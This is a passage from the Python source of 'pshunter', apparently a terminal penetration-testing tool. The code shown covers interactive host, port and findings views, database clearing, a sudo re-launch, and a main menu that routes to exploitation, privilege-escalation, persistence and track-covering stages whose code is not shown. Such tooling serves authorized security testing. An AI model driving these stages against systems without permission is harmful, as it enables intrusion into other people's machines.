    print(f"\n{BOLD}{ip}:{port}/{proto} — DETAILS{RESET}")
    if not rows:
        print(f"  {DIM}None{RESET}")
        return
    for script, output in rows:
        print(f"  {CYAN}{script}{RESET}")
        for line in (output or "").strip().split("\n"):
            print(f"      {line.rstrip()}")


def _port_scripts_view(ip: str, ports: list, n: int) -> None:
    """Sub-view for one port's -sC output: stays open (the ports table is NOT redrawn)
    until the user goes back."""
    if not 1 <= n <= len(ports):
        print(f"{RED}✗ no port {n}{RESET}")
        return
    port, proto, _state = ports[n - 1]

    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "a":
            _manual_add(ip)
            return "stay"                        # keep the info line — don't redraw
        if v == "r":
            _manual_remove(ip)
            return "refresh"
        if v == "f":
            _host_findings_view(ip)
            return "refresh"
        if v == "p":
            _open_host_progress(ip)
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— a · r · f · p · b · enter{RESET}")
        return "stay"

    _run_view(f"{ip}:{port}/{proto}",
              "[Enter] refresh · [a] add · [r] remove manual · [f] findings · [p] progress · [b] back · [m] menu",
              lambda: _render_port_scripts(ip, port, proto), _handle)


def _host_findings_view(ip: str) -> None:
    """Sub-view for one host's findings, opened with [f]; [p] jumps to its progress. Stays
    open (the ports table is NOT redrawn) until the user goes back."""
    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "a":
            _manual_add(ip)
            return "stay"                        # keep the info line — don't redraw the list
        if v == "r":
            _manual_remove(ip)
            return "refresh"
        if v == "p":
            _open_host_progress(ip)
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— a · r · p · b · enter{RESET}")
        return "stay"

    _run_view(f"{ip}/findings", "[Enter] refresh · [a] add · [r] remove manual · [p] progress · [b] back · [m] menu",
              lambda: _render_host_findings(ip), _handle)


def _host_ports_view(rows: list, n: int) -> None:
    """Sub-view for one host's ports: stays open (the host list is NOT redrawn) until the
    user goes back. A port number opens its -sC output; [f]/[p] jump to findings/progress."""
    if not 1 <= n <= len(rows):
        print(f"{RED}✗ no host {n}{RESET}")
        return
    ip = rows[n - 1][0]

    def _handle(ports, v):
        if v == "":
            return "refresh"
        if v == "a":
            _manual_add(ip)
            return "stay"                        # keep the info line — don't redraw the table
        if v == "r":
            _manual_remove(ip)
            return "refresh"
        if v.lower() == "f":
            _host_findings_view(ip)
            return "refresh"
        if v.lower() == "p":
            _open_host_progress(ip)
            return "refresh"
        if v.isdigit():
            n = int(v)
            if 1 <= n <= len(ports):
                _port_scripts_view(ip, ports, n)
                return "refresh"
            print(f"{RED}✗ no port {n}{RESET}")     # bad number → bare re-prompt, no redraw
            return "stay"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> · a · r · f · p · b · enter{RESET}")
        return "stay"

    _run_view(ip, "[Enter] refresh · <n> select · [a] add · [r] remove manual · [f] findings · [p] progress · [b] back · [m] menu",
              lambda: _render_host_ports(ip), _handle)


def clear_database() -> None:
    """Wipe all discovered hosts (and their ports/services) after confirmation."""
    if not os.path.exists(DB_PATH):
        print(f"\n{DIM}database already empty{RESET}")
        return
    ans = _ask("clear ALL discovered hosts (+ ports/services)? [y/N]:")
    if ans is None or ans.lower() != "y":
        print(f"{DIM}cancelled{RESET}")
        return
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for table in ("hosts", "ports", "services", "scripts", "vulns", "exploit_steps", "hostnames"):
                conn.execute(f"DELETE FROM {table}")
            conn.commit()
        finally:
            conn.close()
    print(f"{GREEN}✓ database cleared{RESET}")


def new_session() -> None:
    """Start a fresh session: abort any running scan and wipe the whole database —
    discovered hosts and the command history alike."""
    if not os.path.exists(DB_PATH) and not _JOBS:
        print(f"\n{DIM}already a clean session{RESET}")
        return
    ans = _ask("start a NEW session — wipe ALL data (hosts + history)? [y/N]:")
    if ans is None or ans.lower() != "y":
        print(f"{DIM}cancelled{RESET}")
        return
    with _JOBS_LOCK:
        for j in _JOBS:                   # stop anything still running
            if j["state"] == "running":
                j["cancel"].set()
        _JOBS.clear()
    if os.path.exists(DB_PATH):
        with _DB_LOCK:
            conn = _db_connect()
            try:
                for table in ("hosts", "jobs", "ports", "services", "scripts", "vulns",
                              "exploit_steps", "hostnames"):
                    conn.execute(f"DELETE FROM {table}")
                conn.commit()
            finally:
                conn.close()
    print(f"{GREEN}✓ new session — database cleared{RESET}")


def _upgrade_to_root() -> None:
    """Re-launch pshunter under sudo so SYN/UDP scans get raw-socket privileges. sudo
    itself handles the password (we never see it); progress lives in the DB, so the
    fresh root instance reloads everything. If the password prompt is cancelled we stay
    in the current (unprivileged) session."""
    if _is_root():
        print(f"\n{GREEN}already running as root{RESET}")
        return
    if not shutil.which("sudo"):
        print(f"\n{RED}✗ sudo not found — start it yourself with: sudo pshunter{RESET}")
        return
    running = any(j["state"] == "running" for j in _JOBS)
    note = " (running scans will restart)" if running else ""
    print(f"\n{BOLD}Upgrade to root{RESET}{DIM} — enter your sudo password when asked; "
          f"progress is saved in the database{note}.{RESET}")
    try:
        rc = subprocess.call(["sudo", "-v"])          # prompts on the tty, caches creds
    except OSError as exc:
        print(f"{RED}✗ could not run sudo: {exc}{RESET}")
        return
    if rc != 0:
        print(f"{DIM}upgrade cancelled — still running as a normal user{RESET}")
        return
    # Credentials cached: replace this process with a root one (no second prompt). Keep
    # PURRSH_TERM_ID so the in-app report spawn keeps working after the upgrade.
    print(f"{GREEN}▶ re-launching as root…{RESET}")
    sys.stdout.flush()
    script = os.path.abspath(__file__)
    try:
        os.execvp("sudo", ["sudo", "-n", "--preserve-env=PURRSH_TERM_ID",
                           sys.executable, script])
    except OSError as exc:
        print(f"{RED}✗ re-launch failed: {exc}{RESET}")


def _stop_job(groups: list, n: int) -> None:
    """Signal a running phase (by its status number) to abort — every still-running
    command in the group is killed within a tick; whatever each found so far is kept."""
    if not 1 <= n <= len(groups):
        print(f"{RED}✗ no scan {n}{RESET}")
        return
    grp = groups[n - 1]
    running = [j for j in grp if j["state"] == "running"]
    if not running:
        print(f"{DIM}{n} already {_agg_state([j['state'] for j in grp])}{RESET}")
        return
    for j in running:
        j["cancel"].set()
    print(f"{YELLOW}aborting {n}…{RESET}")


# External terminal emulators tried, in order, for the standalone spawn. The second
# item is the argv that precedes the program to run inside them ("-e" for most,
# "--" for gnome-terminal, "-x" for xfce4-terminal, nothing for kitty).
_TERM_EMULATORS = [
    ("x-terminal-emulator", ["-e"]), ("qterminal", ["-e"]), ("konsole", ["-e"]),
    ("xfce4-terminal", ["-x"]), ("gnome-terminal", ["--"]), ("tilix", ["-e"]),
    ("alacritty", ["-e"]), ("kitty", []), ("xterm", ["-e"]),
]


def _render_report_session(command: str, output: "str | None") -> str:
    """Build the coloured replay text: stock-Kali prompt (frame green/non-bold,
    user㉿host and $ bold-blue, ~ white) + greenish first command word (rest plain)
    + plain output. Kept in sync with the host app's in-tab renderer so both spawn
    paths look identical."""
    E = "\033"
    # cmd1 is the turquoise from QTermWidget's "Linux" scheme (Color6 = 24,178,178),
    # as 24-bit truecolor so the shade is stable across themes.
    grn, bblu, cmd1, wht, rs = (f"{E}[32m", f"{E}[1;34m", f"{E}[38;2;24;178;178m",
                                f"{E}[1;37m", f"{E}[0m")
    import getpass
    import socket
    try:
        user, host = getpass.getuser(), socket.gethostname()
    except Exception:
        user, host = "kali", "kali"
    first, _, rest = command.partition(" ")
    cmd = f"{cmd1}{first}{rs}" + (f" {rest}" if rest else "")
    prompt = (f"{grn}┌──({bblu}{user}㉿{host}{rs}{grn})-[{wht}~{rs}{grn}]{rs}\n"
              f"{grn}└─{bblu}${rs} {cmd}")
    return f"{prompt}\n{output or '(no output captured)'}\n"


def _spawn_report_in_app(job_id: int) -> None:
    """In-app path: emit an OSC 777 marker carrying only the job id. The PurrSh3ll
    host app parses it, reads the command/output from pshunter.db itself and opens
    a QTermWidget tab — so a scanned host cannot forge a command into this channel."""
    sys.stdout.write(f"\033]777;psspawn;{int(job_id)}\007")
    sys.stdout.flush()


def _spawn_report_standalone(job: dict) -> None:
    """Standalone path: render the replay ourselves and open it in an external
    terminal emulator (self-deleting temp file). Falls back to printing inline in the
    current terminal when there is no display or no emulator (e.g. over SSH)."""
    session = _render_report_session(job.get("command", ""), job.get("output"))
    term = next(((shutil.which(b), flag) for b, flag in _TERM_EMULATORS if shutil.which(b)),
                (None, None))
    have_display = os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")
    if not have_display or not term[0]:
        print()                                   # headless fallback: show it here
        sys.stdout.write(session)
        sys.stdout.flush()
        return
    binary, flag = term
    fd, path = tempfile.mkstemp(prefix="pshunter_report_", suffix=".txt")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(session)
        q = shlex.quote(path)
        script = f"clear; cat {q}; rm -f {q}; exec ${{SHELL:-/bin/bash}}"
        subprocess.Popen([binary] + flag + ["sh", "-c", script],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         stdin=subprocess.DEVNULL, start_new_session=True)
        print(f"{GREEN}opened scan output in a new terminal window{RESET}")
    except Exception as exc:
        _safe_unlink(path)
        print(f"{RED}✗ could not open a terminal: {exc}{RESET}")


def _view_command(groups: list, n: int) -> None:
    """Show phase n's command(s) + output in a spawned terminal (variant B) — via the
    PurrSh3ll host app when running inside it, or an external terminal standalone. A phase
    with several commands opens one terminal per finished command."""
    if not 1 <= n <= len(groups):
        print(f"{RED}✗ no scan {n}{RESET}")
        return
    viewable = [j for j in groups[n - 1]
                if j.get("db_id") is not None and j["state"] != "running"]
    if not viewable:
        print(f"{DIM}scan {n} — no captured output yet{RESET}")
        return
    if os.environ.get("PURRSH_TERM_ID"):
        for j in viewable:
            _spawn_report_in_app(j["db_id"])
        note = f" ({len(viewable)} cmds)" if len(viewable) > 1 else ""
        print(f"{GREEN}opened scan {n} output{note} in a new terminal{RESET}")
    else:
        for j in viewable:
            _spawn_report_standalone(j)


def _clear_status() -> None:
    """Drop finished commands from the history (in memory and in the DB); running
    scans are kept so they can still be watched or stopped."""
    with _JOBS_LOCK:
        kept = [j for j in _JOBS if j["state"] == "running"]
        removed = [j for j in _JOBS if j["state"] != "running"]
        _JOBS[:] = kept
    ids = [(j["db_id"],) for j in removed if j.get("db_id") is not None]
    if ids:
        with _DB_LOCK:
            conn = _db_connect()
            try:
                conn.executemany("DELETE FROM jobs WHERE id = ?", ids)
                conn.commit()
            finally:
                conn.close()
    print(f"{GREEN}✓ cleared {len(removed)} finished command(s){RESET}")


# ── action views (stay open until the user goes back) ─────────────────────────
def _run_view(module: str, options: str, render, handle=None) -> None:
    """Keep an interactive screen open. ``render()`` draws the content and may return a
    context passed to ``handle``. ``handle(ctx, v)`` returns 'refresh' to redraw the
    screen or 'stay' to just re-prompt WITHOUT redrawing — so an invalid option / typo
    doesn't reprint the whole view, only the bare prompt shows again. b / back / /exit
    leave. The options hint shows on the first prompt after a redraw, then bare."""
    first = True
    while True:
        if not first:
            _hr()
        first = False
        ctx = render()
        with_opts = True
        while True:
            v = _ctx_ask(module, options if with_opts else "")
            with_opts = False
            if v is None or v.lower() in _BACK_WORDS:
                return
            action = handle(ctx, v.strip().lower()) if handle else "stay"
            if action == "refresh":
                break                             # redraw the screen
            # 'stay' → re-prompt (bare), screen not redrawn


def _view(render, module: str, options: str = "[b] back") -> None:
    """Static screen (e.g. help): drawn once, kept open until the user goes back."""
    _run_view(module, options, render)


def _status_view() -> None:
    """Status screen: refresh, view a scan's command + output in a spawned terminal
    (``v <n>``), stop a running scan (``stop <n>``), or clear finished history."""
    def _handle(jobs, v):
        if v == "":
            return "refresh"
        if v == "c":
            _clear_status()
            return "refresh"
        if v.startswith("stop"):
            rest = v[len("stop"):].strip()
            if rest.isdigit():
                _stop_job(jobs, int(rest))
                return "refresh"
            print(f"{RED}✗ use: stop <n>{RESET}")
            return "stay"
        if v.startswith("v"):
            rest = v[1:].strip()
            if rest.isdigit():
                _view_command(jobs, int(rest))
            else:
                print(f"{RED}✗ use: v <n>{RESET}")
            return "stay"
        if v.isdigit():
            _stop_job(jobs, int(v))
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— v <n> · stop <n> · c · b · enter{RESET}")
        return "stay"

    _run_view("status", "[Enter] refresh · v <n> view · stop <n> abort · [c] clear · [b] back",
              show_status, _handle)


def _database_view() -> None:
    """Database screen: host list; type a host number to see its ports/services,
    ``r <n>`` to remove a host, ``c`` to clear, ``b`` to go back."""
    def _handle(rows, v):
        if v == "":
            return "refresh"
        if v == "a":
            _manual_add_host()
            return "stay"                        # keep the info line — don't redraw the table
        if v == "c":
            clear_database()
            return "refresh"
        if v.startswith("r"):
            rest = v[1:].strip()
            if rest.isdigit():
                _delete_host(rows, int(rest))
                return "refresh"
            print(f"{RED}✗ use: r <n>{RESET}")
            return "stay"
        if v.isdigit():
            _host_ports_view(rows, int(v))
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> · a · r <n> · c · b · enter{RESET}")
        return "stay"

    _run_view("database",
              "[Enter] refresh · <n> select · [a] add host · r <n> remove · [c] clear · [b] back",
              show_database, _handle)


# ── supported-services catalog (reference: what the app covers, and each service's steps) ──
def _service_wired_count(key: str) -> tuple:
    """(#wired-steps, #total-steps) for a service class — wired = a step with a tool in _STEP_TOOLS."""
    steps = _EXPLOIT_STEPS.get(key) or []
    wired = sum(1 for s in steps if _step_parts(s)[1] in _STEP_TOOLS)
    return wired, len(steps)


def _render_services_catalog() -> list:
    """Numbered list of every service the app knows, in exploitation-priority (implementation)
    order. Services with at least one wired tool are bold (implemented); the rest are dim
    (checklist only, no automation yet). Returns the ordered services so a number can pick one."""
    print(f"\n{BOLD}supported services{RESET}  "
          f"{DIM}exploitation order · {BOLD}bold{RESET}{DIM} = wired tools implemented{RESET}")
    rows = []
    for i, (key, label, ports, _tokens) in enumerate(_EXPLOIT_SERVICES, 1):
        wired, total = _service_wired_count(key)
        name = f"{BOLD}{label}{RESET}" if wired > 0 else f"{DIM}{label}{RESET}"
        steps_cell = str(total) if total else "—"
        pr = ", ".join(str(p) for p in sorted(ports)[:5]) + ("…" if len(ports) > 5 else "")
        rows.append([str(i), name, _cell(pr, 20), steps_cell])
    print(_box_table(["#", "SERVICE", "PORTS", "STEPS"], rows, aligns=["r", "l", "l", "l"]))
    return list(_EXPLOIT_SERVICES)


def _render_service_steps(key: str, label: str) -> None:
    """One service's checklist as a static reference (no host / no status): each step, bold with a
    green ● when it's wired to a tool, dim with ○ when it's a manual step; wired steps show what
    runs behind them."""
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
    print(f"\n{BOLD}{label} — checklist{RESET}")
    print()
    for i, step in enumerate(steps, 1):
        desc, tool_key = _step_parts(step)
        has_tool = bool(tool_key and tool_key in _STEP_TOOLS)
        mark = f"●" if has_tool else f"{DIM}○{RESET}"
        text = f"{BOLD}{desc}{RESET}" if has_tool else f"{DIM}{desc}{RESET}"
        print(f"  {CYAN}{i:>2}{RESET} {mark} {text}")
        if has_tool:
            print(f"        {DIM}→ {_step_run_line(tool_key)}{RESET}")


def _services_catalog_view() -> None:
    """Catalog screen: list supported services (implemented ones bold); a number opens that
    service's steps as a read-only reference."""
    def _handle(services, v):
        if v == "":
            return "refresh"
        if v.isdigit():
            n = int(v)
            if 1 <= n <= len(services):
                key, label = services[n - 1][0], services[n - 1][1]
                _view(lambda: _render_service_steps(key, label), f"catalog/{key}", "[b] back")
                return "refresh"
            print(f"{RED}✗ no service {n}{RESET}")
            return "stay"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> · enter · b{RESET}")
        return "stay"

    _run_view("catalog", "[Enter] refresh · <n> view steps · [b] back · [m] menu",
              _render_services_catalog, _handle)


# ── main loop ─────────────────────────────────────────────────────────────────
def main() -> int:
    if any(a in ("-h", "--help") for a in sys.argv[1:]):
        print_help()      # `pshunter -h/--help` (also used by `pshelp pshunter`)
        return 0
    print_header()
    if os.path.exists(DB_PATH):        # apply any pending schema migrations up front
        with _DB_LOCK:
            _db_connect().close()      # (so raw reads like fetch_hosts see new columns)
    _load_jobs()          # restore the saved command history
    _reconcile_hosts_on_start()          # clear any /etc/hosts residue from a prior session
    atexit.register(_remove_all_pshunter_hosts)   # best-effort cleanup on a graceful exit
    try:
        while True:
            print_menu()
            while True:                       # prompt loop: a typo re-prompts bare, the
                try:                          # menu is only reprinted after a real action
                    choice = input(f"{BOLD}{CYAN}[menu]{RESET}{DIM} ›{RESET} ").strip().lower()
                except (EOFError, KeyboardInterrupt):
                    print(f"\n{DIM}bye.{RESET}")
                    return 0

                if choice in ("/exit", "\\exit", "exit", "q", "quit"):
                    print(f"{DIM}bye.{RESET}")
                    return 0
                try:
                    if choice in _HELP_WORDS:
                        _view(print_help, "help")
                    elif choice == "0":
                        _handle_host_discovery()
                    elif choice == "1":
                        _handle_port_enum()
                    elif choice == "2":
                        _handle_service_detection()
                    elif choice == "3":
                        _handle_vuln_scan()
                    elif choice == "4":
                        _handle_cve_lookup()
                    elif choice == "5":
                        _handle_service_exploitation()
                    elif choice == "6":
                        _handle_privesc()
                    elif choice == "7":
                        _handle_persist()
                    elif choice == "8":
                        _handle_cover()
                    elif choice in _PHASES:
                        run_phase(choice)
                    elif choice in ("s", "status"):
                        _status_view()
                    elif choice in ("d", "database"):
                        _database_view()
                    elif choice in ("c", "catalog", "services"):
                        _services_catalog_view()
                    elif choice in ("n", "new"):
                        new_session()
                    elif choice in ("u", "upgrade") and not _is_root():
                        _upgrade_to_root()
                    elif choice in _MENU_WORDS:
                        pass                  # already at the menu → just redraw it
                    else:
                        print(f"{RED}✗ pick 0-8, s, d, c, n, h or /exit{RESET}")
                        continue              # invalid → bare re-prompt, menu not reprinted
                except _ToMenu:               # m/menu typed inside a sub-view → back here
                    pass
                break                         # a valid action ran → redraw the menu

            print(f"{DIM}{'─' * 56}{RESET}\n")
    except _ExitApp:          # /exit typed at any sub-prompt
        print(f"\n{DIM}bye.{RESET}")
        return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        sys.exit(130)
